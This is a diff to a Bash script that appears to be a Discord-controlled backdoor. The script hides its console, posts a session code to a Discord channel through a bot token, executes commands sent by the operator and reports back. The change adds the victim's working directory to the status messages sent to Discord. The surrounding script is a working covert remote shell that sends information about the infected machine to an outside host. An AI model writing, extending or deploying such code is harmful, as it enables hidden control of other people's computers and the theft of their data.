@@ -41,7 +41,8 @@ HideConsole() {
 Authenticate() {
     if [[ "$command_result" == *"$password"* ]]; then
         authenticated=1
-        json_payload="{\"content\": \":white_check_mark:   **Session Connected**   :white_check_mark:\"}"
+        cwd=$(pwd)
+        json_payload="{\"content\": \":white_check_mark:   **Session Connected**   :white_check_mark: \n\`PS: $cwd >\`\"}"
         curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
     else
         authenticated=0
@@ -165,7 +166,8 @@ execute_command() {
                 fi
                 rm "$temp_file"
             else
-                json_payload='{"content": ":white_check_mark:   **Command Executed**   :white_check_mark:"}'
+                cwd=$(pwd)
+                json_payload="{\"content\": \":white_check_mark:   **Command Executed**   :white_check_mark: \n\`PS: $cwd >\`\"}"
                 curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
             fi
         else
@@ -182,7 +184,7 @@ random_letters=$(generate_random_letters)
 password="${password}${random_letters}"
 last_command_file=$(mktemp)
 HideConsole
-json_payload="{\"content\": \":hourglass:   **Session Waiting**  |  Connect Code :  \`$password \`  :hourglass:\"}"
+json_payload="{\"content\": \":hourglass:   **Session Waiting**   :hourglass: \nSession Code :  \`$password \` \"}"
 curl -X POST -H "Authorization: Bot $token" -H "Content-Type: application/json" -d "$json_payload" "https://discord.com/api/v9/channels/$chan/messages"
 
 while true; do
